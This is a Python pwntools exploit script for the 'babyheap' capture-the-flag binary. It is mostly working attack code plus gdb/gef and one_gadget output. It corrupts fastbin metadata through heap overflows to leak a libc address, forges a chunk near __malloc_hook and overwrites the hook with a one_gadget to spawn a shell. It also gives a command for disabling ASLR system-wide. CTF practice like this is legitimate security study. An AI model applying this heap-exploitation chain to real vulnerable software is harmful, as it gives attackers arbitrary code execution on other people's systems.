#!/usr/bin/env python
# -*- coding: utf8 -*-

'''
kill $(pidof gdb) && python babyheap_exploit.py


ASLR
So, to disable it, run
    echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
and to enable it again, run
    echo 2 | sudo tee /proc/sys/kernel/randomize_va_space


gef➤  vmmap heap
Start              End                Offset             Perm Path
0x0000555555554000 0x0000555555556000 0x0000000000000000 io-x /media/sf_VIRTUALBOX_SHARE/babyheap
0x0000555555755000 0x0000555555756000 0x0000000000001000 io-- /media/sf_VIRTUALBOX_SHARE/babyheap
0x0000555555756000 0x0000555555757000 0x0000000000002000 rw- /media/sf_VIRTUALBOX_SHARE/babyheap
0x0000555555757000 0x0000555555778000 0x0000000000000000 rw- [heap]

gef➤  p *(struct malloc_chunk *) 0x7ffff7dd1b10



➜  sf_VIRTUALBOX_SHARE one_gadget /lib/x86_64-linux-gnu/libc.so.6
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL


'''

from pwn import *
import sys

LIBC = "/lib/x86_64-linux-gnu/libc.so.6"

def alloc(size):
    io.sendline('1')
    io.sendlineafter(': ', str(size))
    io.recvuntil(': ', timeout=1)

def fill(idx, data):
    io.sendline('2')
    io.sendlineafter(': ', str(idx))
    io.sendlineafter(': ', str(len(data)))
    io.sendafter(': ', data)
    io.recvuntil(': ')

def free(idx):
    io.sendline('3')
    io.sendlineafter(': ', str(idx))
    io.recvuntil(': ')

def dump(idx):
    io.sendline('4')
    io.sendlineafter(': ', str(idx))
    io.recvuntil(': \n')
    data = io.recvline()
    io.recvuntil(': ')
    return data



if __name__ == "__main__":
    # context.terminal = [ "/usr/bin/zsh" ]
    # context.terminal = [ "bash" ]
    context.terminal = ['tmux', 'splitw', '-v']
    # context.log_level = 'debug'
    # -------------------------------------------------------
    # libc = ELF(LIBC)
    # system_offset = libc.symbols['system']
    # # print(system_offset)
    # print(hex(system_offset))
    # binsh_offset = next(libc.search('/bin/sh\x00'))
    # print(hex(binsh_offset))
    # -------------------------------------------------------

    # p = process("./babyheap")
    # tty  /dev/pts/19
    # break execve
    # continue
    # p.debug()
    # gdb.attach(p, '''''')

    if 1 :
        io = gdb.debug('./babyheap', '''

# tty /dev/pts/27
# gef config context.redirect /dev/pts/26



# break calloc
# commands $bpnum
p $rax
# finish
# p *(struct malloc_chunk *) ($rax - 0x10)

# heap chunks
# heap bins fast
# ctx stack

# continue
# end

# break free
# commands $bpnum
# heap chunks
# p $rax
# fin
# p *(struct malloc_chunk *) ($rax - 0x10)
#
# # heap chunks
# # heap bins fast
# # ctx stack
# continue
# end


# heap memory
# memory watch 0x0000555555757000 70

# define hook-stop
# p "======================================================"
# heap bins
# p "======================================================"
# print $newcmd()
# p "======================================================"
# end


# continue

p "lol its work"

dir /usr/src/glibc/glibc-2.23/malloc/

set follow-fork-mode parent
set verbose on

set print pretty on

source /home/ubuntu/.gdbinit-gef.py
gef config context.nb_lines_code 10


define n
next
heap chunks
heap bins
end

gef config context.layout "memory"
source helper.py
# b malloc

continue
        ''')
    else:
        io = process("./babyheap", stdout=PIPE)


    alloc(0x10) # 0
    alloc(0x10) # 1
    alloc(0x10) # 2
    alloc(0x80) # 3
    alloc(0x80) # 4

    fill(2,
         p8(0xf1) * 0x10 +
         p64(0x0000000000000000) +
         p64(0x0000000000000021))

    free(2)
    free(1)

    fill(0,
         p8(0xf2) * 0x10 +
         p64(0x0000000000000000) +
         p64(0x0000000000000021) +
         p8(0x60))

    alloc(0x10) # 1
    alloc(0x10) #

    fill(1,
         p8(0xf3) * 0x10 +
         p64(0x0000000000000000) +
         p64(0x0000000000000021) +
         p8(0xf3) * 0x10 +
         p64(0x0000000000000000) +
         p64(0x91))


    free(3)
    print(dump(2))

    arena_top_chunk = u64(dump(2)[:8])
    print("arena_top_chunk: " + hex(arena_top_chunk))  # arena_top_chunk: 0x00007ffff7dd1b78

    alloc(0x60)  # 2 or 3 it's same pointer
    fill(3,
         p8(0xf4) * 0x60)

    free(3)

    '''
    gef➤  p &__malloc_hook
    $8 = (void *(**)(size_t, const void *)) 0x7ffff7dd1b10 <__malloc_hook>

    gef➤  p 0x00007ffff7dd1b78 - 0x7ffff7dd1b10
    $12 = 0x68
    '''

    malloc_hook_offset = arena_top_chunk - 0x68  # Without Any Words (Only Crying and Laughter)
    print("malloc_hook_offset: " + hex(malloc_hook_offset))  # malloc_hook_offset: 0x7ffff7dd1b10

    '''
    #--------------------------------------------------------------------------
    malloc.c
    #--------------------------------------------------------------------------

    #define fastbin_index(sz) \
      ((((unsigned int) (sz)) >> (SIZE_SZ == 8 ? 4 : 3)) - 2)
    ...
    if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0))
      {
        errstr = "malloc(): memory corruption (fast)";
    '''

    '''
    gef➤  p 0x7ffff7dd1b10 - 0x23
    $4 = 0x7ffff7dd1aed
    gef➤  p *(struct malloc_chunk *) 0x7ffff7dd1aed
    $5 = {
      prev_size = 0xfff7dd0260000000,
      size = 0x7f,
      fd = 0xfff7a92e20000000,
      bk = 0xfff7a92a0000007f,
      fd_nextsize = 0x7f,
      bk_nextsize = 0x0
    }
    '''

    '''
    ➜  sf_VIRTUALBOX_SHARE one_gadget /lib/x86_64-linux-gnu/libc.so.6
    0x45216 execve("/bin/sh", rsp+0x30, environ)
    constraints:
      rax == NULL

    0x4526a execve("/bin/sh", rsp+0x30, environ)
    constraints:
      [rsp+0x30] == NULL

    0xf02a4 execve("/bin/sh", rsp+0x50, environ)
    constraints:
      [rsp+0x50] == NULL

    0xf1147 execve("/bin/sh", rsp+0x70, environ)
    constraints:
      [rsp+0x70] == NULL

    '''

    fill(2,
         p64(malloc_hook_offset - 0x23) +  # malloc_hook  0x00007ffff7dd1b78
         p8(0xf5) * 0x58)

    # io.interactive()

    alloc(0x60)
    alloc(0x60)

    '''
    gef➤  vmmap libc
    Start              End                Offset             Perm Path
    0x00007ffff7a0d000 0x00007ffff7bcd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so
    0x00007ffff7bcd000 0x00007ffff7dcd000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so
    0x00007ffff7dcd000 0x00007ffff7dd1000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so
    0x00007ffff7dd1000 0x00007ffff7dd3000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so
    gef➤  p 0x7ffff7dd1b78 - 0x00007ffff7a0d000
    $3 = 0x3c4b78
    '''
    fill(5, '\x00' * 0x13 + p64(arena_top_chunk - 0x3c4b78 + 0x4526a))

    # io.interactive()

    alloc(31337)

    io.interactive()
